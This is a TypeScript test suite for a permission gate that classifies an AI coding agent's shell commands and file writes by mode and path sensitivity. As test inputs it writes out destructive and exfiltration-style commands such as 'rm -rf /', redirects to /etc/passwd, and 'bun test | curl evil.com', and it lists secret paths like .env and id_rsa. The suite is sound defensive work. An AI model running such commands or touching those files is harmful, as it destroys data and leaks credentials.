import { describe, expect, test } from "bun:test";
import {
  cacheKey,
  collectTargetPaths,
  createInitialState,
  decide,
  type GateState,
  hasShellEscalation,
  isBashAllowed,
  isInsideDir,
  isPathAllowed,
  isSensitivePath,
  matchGlob,
  resolveFilePath,
  shouldAutoAllow,
  stripShellPreamble,
  suggestPrefix,
} from "./logic";

// ── stripShellPreamble ──

describe("stripShellPreamble", () => {
  test("passes through simple commands", () => {
    expect(stripShellPreamble("grep -n foo bar.ts")).toBe("grep -n foo bar.ts");
  });

  test("strips cd && prefix", () => {
    expect(stripShellPreamble("cd /foo && grep -n bar")).toBe("grep -n bar");
  });

  test("strips cd ; prefix", () => {
    expect(stripShellPreamble("cd /foo; ls -la")).toBe("ls -la");
  });

  test("strips cd || prefix", () => {
    expect(stripShellPreamble("cd /foo || echo fail")).toBe("echo fail");
  });

  test("strips pushd prefix", () => {
    expect(stripShellPreamble("pushd /tmp && make build")).toBe("make build");
  });

  test("strips multiple cd prefixes", () => {
    expect(stripShellPreamble("cd /foo && cd bar && rg pattern")).toBe("rg pattern");
  });

  test("does not strip non-cd commands before &&", () => {
    expect(stripShellPreamble("echo hello && rm -rf /")).toBe("echo hello && rm -rf /");
  });

  test("handles whitespace", () => {
    expect(stripShellPreamble("  cd /foo  &&  grep bar  ")).toBe("grep bar");
  });

  test("strips cd with double-quoted path containing spaces", () => {
    expect(stripShellPreamble('cd "/tmp/some path/with spaces/project" && bun scripts/run.ts --flag')).toBe(
      "bun scripts/run.ts --flag",
    );
  });

  test("strips cd with single-quoted path containing spaces", () => {
    expect(stripShellPreamble("cd '/tmp/path with spaces/dir' && ls -la")).toBe("ls -la");
  });

  test("strips multiple cd with quoted paths", () => {
    expect(stripShellPreamble('cd "/tmp/path one" && cd "/tmp/path two" && echo done')).toBe("echo done");
  });
});

// ── suggestPrefix ──

describe("suggestPrefix", () => {
  test("single token command", () => {
    expect(suggestPrefix("ls")).toBe("ls");
  });

  test("two token command returns first token", () => {
    expect(suggestPrefix("bun test")).toBe("bun");
  });

  test("takes first token of longer command", () => {
    expect(suggestPrefix("bun test --filter=pro --watch")).toBe("bun");
  });

  test("strips cd preamble first", () => {
    expect(suggestPrefix("cd /foo && grep -rn pattern src/")).toBe("grep");
  });

  test("strips cd with quoted path containing spaces", () => {
    expect(suggestPrefix('cd "/tmp/some path/with spaces/project" && bun scripts/run.ts --flag')).toBe("bun");
  });
});

// ── hasShellEscalation ──

describe("hasShellEscalation", () => {
  test("simple command is not escalated", () => {
    expect(hasShellEscalation("rg -n pattern src/")).toBe(false);
  });

  test("pipe to unsafe command is escalation", () => {
    expect(hasShellEscalation("rg foo | xargs rm")).toBe(true);
  });

  test("pipe to safe filter is not escalation", () => {
    expect(hasShellEscalation("rg foo | head -5")).toBe(false);
    expect(hasShellEscalation("rg foo | tail -3")).toBe(false);
    expect(hasShellEscalation("rg foo | wc -l")).toBe(false);
    expect(hasShellEscalation("rg foo | sort | uniq")).toBe(false);
    expect(hasShellEscalation("cat file.json | jq .key")).toBe(false);
  });

  test("pipe chain with one unsafe target is escalation", () => {
    expect(hasShellEscalation("rg foo | sort | xargs rm")).toBe(true);
  });

  test("semicolon is escalation", () => {
    expect(hasShellEscalation("echo hello; rm -rf /")).toBe(true);
  });

  test("&& chain is escalation", () => {
    expect(hasShellEscalation("rg foo && rm bar")).toBe(true);
  });

  test("subshell $() is escalation", () => {
    expect(hasShellEscalation("echo $(rm -rf /)")).toBe(true);
  });

  test("backtick is escalation", () => {
    expect(hasShellEscalation("echo `rm -rf /`")).toBe(true);
  });

  test("output redirect is escalation", () => {
    expect(hasShellEscalation("echo hello > /etc/passwd")).toBe(true);
  });

  test("append redirect is escalation", () => {
    expect(hasShellEscalation("echo hello >> /tmp/log")).toBe(true);
  });

  test("fd duplication 2>&1 is NOT escalation", () => {
    expect(hasShellEscalation("some_cmd 2>&1")).toBe(false);
  });

  test("find -exec is escalation", () => {
    expect(hasShellEscalation('find . -name "*.ts" -exec rm {} \\;')).toBe(true);
  });

  test("find -delete is escalation", () => {
    expect(hasShellEscalation("find /tmp -name '*.log' -delete")).toBe(true);
  });

  test("find without -exec is not escalated", () => {
    expect(hasShellEscalation('find . -name "*.ts" -type f')).toBe(false);
  });

  test("pipe inside double quotes is not escalation", () => {
    expect(hasShellEscalation('grep -E "foo|bar" file.txt')).toBe(false);
  });

  test("pipe inside single quotes is not escalation", () => {
    expect(hasShellEscalation("grep -E 'foo|bar' file.txt")).toBe(false);
  });

  test("&& inside quotes is not escalation", () => {
    expect(hasShellEscalation('echo "a && b"')).toBe(false);
  });

  test("$() inside double quotes is hidden by quote stripping", () => {
    expect(hasShellEscalation('echo "today is $(date +%Y-%m-%d)"')).toBe(false);
  });

  test("backticks inside double quotes are hidden by quote stripping", () => {
    expect(hasShellEscalation('echo "user is `whoami`"')).toBe(false);
  });

  test("$() outside quotes IS escalation", () => {
    expect(hasShellEscalation("echo $(date)")).toBe(true);
  });

  test("backticks outside quotes IS escalation", () => {
    expect(hasShellEscalation("echo `whoami`")).toBe(true);
  });

  test("semicolons with harmless commands still escalate", () => {
    expect(hasShellEscalation('echo "harmless" ; echo "also harmless"')).toBe(true);
  });

  test("&& with harmless commands still escalates", () => {
    expect(hasShellEscalation('echo "first" && echo "second"')).toBe(true);
  });
});

// ── isSensitivePath ──

describe("isSensitivePath", () => {
  test(".env is sensitive", () => {
    expect(isSensitivePath(".env")).toBe(true);
  });

  test(".env.local is sensitive", () => {
    expect(isSensitivePath(".env.local")).toBe(true);
  });

  test(".env.production is sensitive", () => {
    expect(isSensitivePath(".env.production")).toBe(true);
  });

  test("nested .env is sensitive", () => {
    expect(isSensitivePath("apps/backend/.env")).toBe(true);
  });

  test(".pem file is sensitive", () => {
    expect(isSensitivePath("certs/server.pem")).toBe(true);
  });

  test(".key file is sensitive", () => {
    expect(isSensitivePath("ssl/private.key")).toBe(true);
  });

  test("secrets directory is sensitive", () => {
    expect(isSensitivePath("secrets/db-password.txt")).toBe(true);
  });

  test("path containing secret is sensitive", () => {
    expect(isSensitivePath("config/my-secret-config.json")).toBe(true);
  });

  test(".ssh directory is sensitive", () => {
    expect(isSensitivePath(".ssh/config")).toBe(true);
  });

  test("id_rsa is sensitive", () => {
    expect(isSensitivePath("id_rsa")).toBe(true);
    expect(isSensitivePath("id_rsa.pub")).toBe(true);
  });

  test("id_ed25519 is sensitive", () => {
    expect(isSensitivePath("id_ed25519")).toBe(true);
  });

  test("regular files are not sensitive", () => {
    expect(isSensitivePath("src/main.ts")).toBe(false);
    expect(isSensitivePath("package.json")).toBe(false);
    expect(isSensitivePath("README.md")).toBe(false);
  });

  test("environment.ts is not sensitive (no dot prefix)", () => {
    expect(isSensitivePath("src/environment.ts")).toBe(false);
  });
});

// ── isInsideDir ──

describe("isInsideDir", () => {
  test("file inside dir", () => {
    expect(isInsideDir("/home/user/project/src/main.ts", "/home/user/project")).toBe(true);
  });

  test("file at dir root", () => {
    expect(isInsideDir("/home/user/project/file.txt", "/home/user/project")).toBe(true);
  });

  test("file outside dir", () => {
    expect(isInsideDir("/home/user/other/file.txt", "/home/user/project")).toBe(false);
  });

  test("parent dir", () => {
    expect(isInsideDir("/home/user/file.txt", "/home/user/project")).toBe(false);
  });
});

// ── matchGlob ──

describe("matchGlob", () => {
  test("exact match", () => {
    expect(matchGlob("src/main.ts", "src/main.ts")).toBe(true);
  });

  test("* matches within directory", () => {
    expect(matchGlob("src/main.ts", "src/*.ts")).toBe(true);
    expect(matchGlob("src/utils.ts", "src/*.ts")).toBe(true);
  });

  test("* does not cross directories", () => {
    expect(matchGlob("src/deep/main.ts", "src/*.ts")).toBe(false);
  });

  test("** matches across directories", () => {
    expect(matchGlob("src/deep/main.ts", "**/*.ts")).toBe(true);
    expect(matchGlob("main.ts", "**/*.ts")).toBe(true);
  });

  test("** at start", () => {
    expect(matchGlob("a/b/c.nix", "**/*.nix")).toBe(true);
  });

  test("specific directory with **", () => {
    expect(matchGlob("config/llm/pi/foo.ts", "config/llm/pi/**")).toBe(true);
    expect(matchGlob("config/llm/pi/sub/bar.ts", "config/llm/pi/**")).toBe(true);
    expect(matchGlob("config/other/foo.ts", "config/llm/pi/**")).toBe(false);
  });

  test("? matches single char", () => {
    expect(matchGlob("src/a.ts", "src/?.ts")).toBe(true);
    expect(matchGlob("src/ab.ts", "src/?.ts")).toBe(false);
  });

  test("no match", () => {
    expect(matchGlob("src/main.js", "src/*.ts")).toBe(false);
  });
});

// ── resolveFilePath ──

describe("resolveFilePath", () => {
  test("strips leading @", () => {
    expect(resolveFilePath("@src/main.ts", "/project")).toBe("/project/src/main.ts");
  });

  test("resolves relative path", () => {
    expect(resolveFilePath("src/main.ts", "/project")).toBe("/project/src/main.ts");
  });

  test("keeps absolute path", () => {
    expect(resolveFilePath("/tmp/file.txt", "/project")).toBe("/tmp/file.txt");
  });
});

// ── collectTargetPaths ──

describe("collectTargetPaths", () => {
  test("write/edit: single top-level path", () => {
    expect(collectTargetPaths("write", { path: "src/a.ts" }, "/project")).toEqual(["/project/src/a.ts"]);
    expect(collectTargetPaths("edit", { path: "src/a.ts" }, "/project")).toEqual(["/project/src/a.ts"]);
  });

  test("patch: collects top-level + per-edit paths (multi-file)", () => {
    const input = {
      path: "src/a.ts",
      edits: [
        { oldText: "a", newText: "b" },
        { oldText: "c", newText: "d", path: "src/b.ts" },
      ],
    };
    expect(collectTargetPaths("patch", input, "/project")).toEqual(["/project/src/a.ts", "/project/src/b.ts"]);
  });

  test("patch: per-edit path overrides top-level", () => {
    const input = {
      path: "src/default.ts",
      edits: [{ oldText: "a", newText: "b", path: "src/actual.ts" }],
    };
    expect(collectTargetPaths("patch", input, "/project")).toEqual(["/project/src/actual.ts"]);
  });

  test("patch: falls back to top-level when edit has no path", () => {
    const input = {
      path: "src/a.ts",
      edits: [{ oldText: "a", newText: "b" }],
    };
    expect(collectTargetPaths("patch", input, "/project")).toEqual(["/project/src/a.ts"]);
  });

  test("patch: strips leading @", () => {
    const input = { path: "@src/a.ts", edits: [{ oldText: "a", newText: "b" }] };
    expect(collectTargetPaths("patch", input, "/project")).toEqual(["/project/src/a.ts"]);
  });

  test("returns empty when no path resolvable", () => {
    expect(collectTargetPaths("patch", { edits: [{ oldText: "a", newText: "b" }] }, "/project")).toEqual([]);
    expect(collectTargetPaths("write", {}, "/project")).toEqual([]);
  });
});

// ── isPathAllowed / isBashAllowed ──

describe("isPathAllowed", () => {
  const baseState = createInitialState();

  test("exact path match", () => {
    const state: GateState = { ...baseState, allowedPaths: ["src/main.ts"] };
    expect(isPathAllowed("/project/src/main.ts", "/project", state)).toBe(true);
  });

  test("prefix path match", () => {
    const state: GateState = { ...baseState, allowedPaths: ["src/"] };
    expect(isPathAllowed("/project/src/main.ts", "/project", state)).toBe(true);
    expect(isPathAllowed("/project/src/deep/file.ts", "/project", state)).toBe(true);
  });

  test("glob match", () => {
    const state: GateState = { ...baseState, allowedPathGlobs: ["**/*.nix"], gitRoot: "/project" };
    expect(isPathAllowed("/project/modules/foo.nix", "/project", state)).toBe(true);
    expect(isPathAllowed("/project/modules/foo.ts", "/project", state)).toBe(false);
  });

  test("no match", () => {
    const state: GateState = { ...baseState, allowedPaths: ["src/main.ts"] };
    expect(isPathAllowed("/project/other/file.ts", "/project", state)).toBe(false);
  });
});

describe("isBashAllowed", () => {
  const baseState = createInitialState();

  test("prefix match", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["bun"] };
    expect(isBashAllowed("bun test --filter=pro", state)).toBe(true);
  });

  test("strips preamble before matching", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["grep"] };
    expect(isBashAllowed("cd /foo && grep -n pattern file.ts", state)).toBe(true);
  });

  test("no match", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["bun"] };
    expect(isBashAllowed("rm -rf /", state)).toBe(false);
  });

  test("piped command to unsafe target not allowed", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["rg"] };
    expect(isBashAllowed("rg foo | xargs rm", state)).toBe(false);
  });

  test("piped command to safe filter is allowed", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["rg"] };
    expect(isBashAllowed("rg foo | head -5", state)).toBe(true);
    expect(isBashAllowed("rg foo | tail -3", state)).toBe(true);
  });

  test("chained command not allowed even with matching prefix", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["rg"] };
    expect(isBashAllowed("rg foo && rm bar", state)).toBe(false);
  });

  test("redirected command not allowed even with matching prefix", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["echo"] };
    expect(isBashAllowed("echo secret > /tmp/leak", state)).toBe(false);
  });

  test("simple command with same prefix is allowed", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["rg"] };
    expect(isBashAllowed("rg -l pattern src/", state)).toBe(true);
    expect(isBashAllowed("rg --count foo", state)).toBe(true);
  });

  test("unsafe pipe not allowed even after session-allowing the base command", () => {
    const state: GateState = { ...baseState, allowedBashPrefixes: ["ls"] };
    expect(isBashAllowed("ls /tmp", state)).toBe(true);
    expect(isBashAllowed("ls /tmp | head -5", state)).toBe(true);
    expect(isBashAllowed("ls /tmp | xargs echo", state)).toBe(false);
  });
});

// ── decide ──

describe("decide", () => {
  const cwd = "/project";

  function stateWith(overrides: Partial<GateState> = {}): GateState {
    return { ...createInitialState(), gitRoot: "/project", ...overrides };
  }

  // Allow-all mode
  test("allow-all passes everything", () => {
    const state = stateWith({ mode: "allow-all" });
    expect(decide("bash", { command: "rm -rf /" }, cwd, state).action).toBe("allow");
    expect(decide("write", { path: "/etc/passwd" }, cwd, state).action).toBe("allow");
  });

  // Read-only tools
  test("read-only tools always allowed", () => {
    const state = stateWith({ mode: "careful" });
    expect(decide("read", { path: "src/main.ts" }, cwd, state).action).toBe("allow");
    expect(decide("grep", { pattern: "foo" }, cwd, state).action).toBe("allow");
    expect(decide("find", { path: "." }, cwd, state).action).toBe("allow");
    expect(decide("ls", { path: "." }, cwd, state).action).toBe("allow");
    expect(decide("web_search", { query: "foo" }, cwd, state).action).toBe("allow");
    // Network read: no local side effect, so no confirmation.
    expect(decide("web_fetch", { url: "https://example.com" }, cwd, state).action).toBe("allow");
    // Read-only extension tools. Without an entry here they fall through to the
    // unknown-tool branch and confirm on every call in Careful mode.
    expect(decide("todo_check", {}, cwd, state).action).toBe("allow");
    expect(decide("describe_image", { path: "shot.png" }, cwd, state).action).toBe("allow");
  });

  // Delegation
  test("subagent confirms in careful mode (delegation veto)", () => {
    // Not a safety gate — `subagent` mutates nothing. It is the only cheap
    // point at which a delegation can be declined before the child starts.
    const state = stateWith({ mode: "careful" });
    const d = decide("subagent", { agent: "researcher", task: "x" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.reason).toBe("Unknown tool: subagent");
  });

  test("subagent allowed under trust-project like any other unknown tool", () => {
    const state = stateWith({ mode: "trust-project" });
    expect(decide("subagent", { agent: "researcher", task: "x" }, cwd, state).action).toBe("allow");
  });

  test("unknown tool still confirms in careful mode", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("some_new_tool", {}, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.reason).toBe("Unknown tool: some_new_tool");
  });

  // Careful mode
  test("careful: write in project needs confirmation", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("write", { path: "src/main.ts" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("write");
  });

  test("careful: write outside project needs confirmation", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("write", { path: "/tmp/file.txt" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("write");
  });

  test("careful: sensitive file gets sensitive confirmation", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("write", { path: ".env" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("sensitive");
  });

  test("careful: bash needs confirmation", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("bash", { command: "echo hello" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("bash");
  });

  test("careful: bash with prefix allowed", () => {
    const state = stateWith({ mode: "careful", allowedBashPrefixes: ["echo"] });
    expect(decide("bash", { command: "echo hello" }, cwd, state).action).toBe("allow");
  });

  test("careful: allowed path passes", () => {
    const state = stateWith({ mode: "careful", allowedPaths: ["src/main.ts"] });
    expect(decide("write", { path: "src/main.ts" }, cwd, state).action).toBe("allow");
  });

  test("careful: allowed glob passes", () => {
    const state = stateWith({ mode: "careful", allowedPathGlobs: ["**/*.nix"] });
    expect(decide("edit", { path: "modules/foo.nix" }, cwd, state).action).toBe("allow");
  });

  // Trust project mode
  test("trust-project: write in project allowed", () => {
    const state = stateWith({ mode: "trust-project" });
    expect(decide("write", { path: "src/main.ts" }, cwd, state).action).toBe("allow");
  });

  test("trust-project: write outside project needs confirmation", () => {
    const state = stateWith({ mode: "trust-project" });
    const d = decide("write", { path: "/tmp/file.txt" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("outside-project");
  });

  test("trust-project: sensitive file in project still confirms", () => {
    const state = stateWith({ mode: "trust-project" });
    const d = decide("write", { path: ".env" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("sensitive");
  });

  test("trust-project: bash still confirms", () => {
    const state = stateWith({ mode: "trust-project" });
    const d = decide("bash", { command: "npm install" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("bash");
  });

  // Tool overrides
  test("tool override allows tool but still checks sensitive", () => {
    const state = stateWith({ mode: "careful", toolOverrides: { edit: "allow" } });
    expect(decide("edit", { path: "src/main.ts" }, cwd, state).action).toBe("allow");

    const d = decide("edit", { path: ".env" }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("sensitive");
  });

  test("tool override does not affect other tools", () => {
    const state = stateWith({ mode: "careful", toolOverrides: { edit: "allow" } });
    const d = decide("write", { path: "src/main.ts" }, cwd, state);
    expect(d.action).toBe("confirm");
  });

  // Bash prefix suggestion
  test("bash decision includes suggested prefix", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("bash", { command: "cd /foo && bun test --filter=pro" }, cwd, state);
    expect(d.suggestedPrefix).toBe("bun");
  });

  test("bash decision flags escalation when prefix is already allowed", () => {
    const state = stateWith({ mode: "careful", allowedBashPrefixes: ["echo"] });
    const d = decide("bash", { command: 'echo "first" && echo "second"' }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.escalation).toBe(true);
  });

  test("bash decision does not flag escalation for unmatched prefix", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("bash", { command: "rm -rf /" }, cwd, state);
    expect(d.escalation).toBeFalsy();
  });

  // Sensitive path allowed via session allow
  test("sensitive file allowed if in allowedPaths", () => {
    const state = stateWith({ mode: "careful", allowedPaths: [".env"] });
    expect(decide("write", { path: ".env" }, cwd, state).action).toBe("allow");
  });

  // ── patch (multi-file path handling) ──

  test("patch treated as write-like (not unknown)", () => {
    const state = stateWith({ mode: "careful" });
    const d = decide("patch", { path: "src/main.ts", edits: [{ oldText: "a", newText: "b" }] }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("write");
  });

  test("patch: trust-project allows all in-project edits", () => {
    const state = stateWith({ mode: "trust-project" });
    const input = {
      path: "src/a.ts",
      edits: [
        { oldText: "a", newText: "b" },
        { oldText: "c", newText: "d", path: "src/b.ts" },
      ],
    };
    expect(decide("patch", input, cwd, state).action).toBe("allow");
  });

  test("patch: trust-project confirms when ANY per-edit path is outside project", () => {
    const state = stateWith({ mode: "trust-project" });
    const input = {
      path: "src/a.ts",
      edits: [
        { oldText: "a", newText: "b" },
        { oldText: "c", newText: "d", path: "/tmp/out.ts" },
      ],
    };
    const d = decide("patch", input, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("outside-project");
  });

  test("patch: sensitive per-edit path is caught even with safe top-level path", () => {
    // The security-critical case: top-level path is benign, but one edit
    // targets a sensitive file via per-edit path. Must not slip through.
    const state = stateWith({ mode: "trust-project" });
    const input = {
      path: "src/a.ts",
      edits: [
        { oldText: "a", newText: "b" },
        { oldText: "x", newText: "y", path: ".env" },
      ],
    };
    const d = decide("patch", input, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("sensitive");
  });

  test("patch: tool override still checks sensitive per-edit paths", () => {
    const state = stateWith({ mode: "careful", toolOverrides: { patch: "allow" } });
    expect(decide("patch", { path: "src/a.ts", edits: [{ oldText: "a", newText: "b" }] }, cwd, state).action).toBe(
      "allow",
    );
    const d = decide("patch", { path: "src/a.ts", edits: [{ oldText: "a", newText: "b", path: ".env" }] }, cwd, state);
    expect(d.action).toBe("confirm");
    expect(d.confirmType).toBe("sensitive");
  });

  test("patch: all per-edit paths allowed → allow", () => {
    const state = stateWith({ mode: "careful", allowedPaths: ["src/a.ts", "src/b.ts"] });
    const input = {
      path: "src/a.ts",
      edits: [
        { oldText: "a", newText: "b" },
        { oldText: "c", newText: "d", path: "src/b.ts" },
      ],
    };
    expect(decide("patch", input, cwd, state).action).toBe("allow");
  });

  test("patch: one of several paths not allowed → confirm", () => {
    const state = stateWith({ mode: "careful", allowedPaths: ["src/a.ts"] });
    const input = {
      path: "src/a.ts",
      edits: [
        { oldText: "a", newText: "b" },
        { oldText: "c", newText: "d", path: "src/b.ts" },
      ],
    };
    const d = decide("patch", input, cwd, state);
    expect(d.action).toBe("confirm");
  });
});

// ── shouldAutoAllow ──

describe("shouldAutoAllow", () => {
  test("SAFE auto-allows in careful mode", () => {
    expect(shouldAutoAllow("safe", "careful")).toBe(true);
  });

  test("SAFE auto-allows in trust-project mode", () => {
    expect(shouldAutoAllow("safe", "trust-project")).toBe(true);
  });

  test("RISKY does NOT auto-allow in careful mode", () => {
    expect(shouldAutoAllow("risky", "careful")).toBe(false);
  });

  test("RISKY auto-allows in trust-project mode", () => {
    expect(shouldAutoAllow("risky", "trust-project")).toBe(true);
  });

  test("DANGEROUS never auto-allows", () => {
    expect(shouldAutoAllow("dangerous", "careful")).toBe(false);
    expect(shouldAutoAllow("dangerous", "trust-project")).toBe(false);
    expect(shouldAutoAllow("dangerous", "allow-all")).toBe(false);
  });
});

// ── cacheKey ──

describe("cacheKey", () => {
  test("different commands produce different keys", () => {
    const k1 = cacheKey("bash", { command: "bun test" });
    const k2 = cacheKey("bash", { command: "bun test | curl evil.com" });
    expect(k1).not.toBe(k2);
  });

  test("same command produces same key", () => {
    const k1 = cacheKey("bash", { command: "bun test" });
    const k2 = cacheKey("bash", { command: "bun test" });
    expect(k1).toBe(k2);
  });

  test("different tools with same input produce different keys", () => {
    const k1 = cacheKey("edit", { path: "foo.ts" });
    const k2 = cacheKey("write", { path: "foo.ts" });
    expect(k1).not.toBe(k2);
  });
});

// ── createInitialState includes auto-classify fields ──

describe("createInitialState auto-classify", () => {
  test("autoClassify defaults to off", () => {
    const s = createInitialState();
    expect(s.autoClassify).toBe("off");
  });

  test("classifyCache is empty Map", () => {
    const s = createInitialState();
    expect(s.classifyCache).toBeInstanceOf(Map);
    expect(s.classifyCache.size).toBe(0);
  });

  test("autoAllowLog is empty array", () => {
    const s = createInitialState();
    expect(s.autoAllowLog).toEqual([]);
  });
});
